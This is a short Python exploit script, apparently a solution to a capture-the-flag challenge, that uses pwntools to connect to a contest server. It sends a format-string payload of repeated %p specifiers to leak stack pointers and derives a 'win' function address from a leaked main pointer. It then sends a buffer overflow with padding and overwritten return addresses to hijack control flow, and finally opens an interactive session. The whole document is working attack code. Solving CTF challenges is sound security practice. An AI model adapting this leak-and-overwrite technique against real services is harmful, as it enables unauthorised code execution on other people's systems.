#!/usr/bin/env python3

from pwn import *

format_string = "|".join(["%p" for _ in range(65)])

p = remote("hax1.allesctf.net", 9100)

p.recvuntil("Enter your witch name:")
p.sendline(format_string)

leaks = p.recvuntil("enter your magic spell:").decode("utf-8").split("|")

main = int(leaks[46], 16)
log.info(f"leaked main pointer: {hex(main)}")
win = main - 0x108
ret = win + 0x36

padding = b"A"*cyclic_find(b"cnaa")

p.sendline(b"Expelliarmus\x00"+padding+p64(ret)+p64(win))

p.interactive()
